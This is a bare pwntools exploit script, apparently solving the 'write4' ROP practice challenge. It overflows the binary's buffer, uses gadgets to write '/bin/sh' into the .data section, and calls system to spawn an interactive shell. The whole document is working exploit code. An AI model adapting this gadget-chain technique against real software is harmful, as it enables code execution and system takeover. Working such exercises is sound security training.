from pwn import *
context.log_level = 'debug'
sh = process("./write4")
elf = ELF("./write4")
system = elf.plt['system']
data_addr = 0x601050
mov_r15_r14 = 0x400820 #  : mov qword ptr [r14], r15 ; ret
pop_r14_r15 = 0x400890 #  : pop r14 ; pop r15 ; ret
pop_rdi = 0x400893  # pop rdi ; ret
ret = 0x4005b9
sh.recv()

payload = b'a' * 0x28
payload += p64(pop_r14_r15) + p64(data_addr) + bytes("/bin/sh\x00", encoding = "ascii")
payload += p64(mov_r15_r14)
payload += p64(pop_rdi) + p64(data_addr) + p64(ret) +  p64(system)

sh.sendline(payload)
sh.interactive()
